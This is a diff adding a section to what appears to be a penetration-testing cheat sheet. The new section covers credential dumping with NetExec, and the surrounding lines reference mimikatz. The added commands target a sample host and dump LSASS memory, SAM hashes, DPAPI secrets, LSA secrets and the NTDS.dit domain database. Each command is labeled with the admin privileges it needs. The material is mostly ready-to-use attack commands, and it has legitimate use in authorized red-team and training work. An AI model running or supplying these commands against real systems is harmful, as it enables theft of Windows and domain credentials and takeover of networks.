@@ -66,6 +66,28 @@ mimikatz # sekurlsa::logonpasswords
 
 <details>
 
+<summary>Credential Dumping With NetExec (nxc)</summary>
+
+<pre><code># Dump LSASS (Local Admin Privileges)
+nxc smb 192.168.255.131 -u &#x3C;username> -p &#x3C;password> -M lsassy [--local-auth]
+
+<strong># Dump SAM (Local Admin Privileges)
+</strong>nxc smb 192.168.255.131 -u &#x3C;username> -p &#x3C;password> --sam [secdump] [--local-auth]
+<strong>
+</strong># Dump DPAPI (Local Admin Privileges)
+nxc smb 192.168.255.131 -u &#x3C;username> -p &#x3C;password> --dpapi
+
+<strong># Dump LSA Secrets (Domain Admin or Local Admin on DC)
+</strong>nxc smb 192.168.255.131 -u &#x3C;username> -p &#x3C;password> --lsa [secdump]
+
+# Dump NTDS.dit (Domain Admin or Local Admin on DC)
+nxc smb 192.168.255.131 -u &#x3C;username> -p &#x3C;password> --ntds
+</code></pre>
+
+</details>
+
+<details>
+
 <summary>Mimikatz from dmp file</summary>
 
 <pre><code><strong>using System;
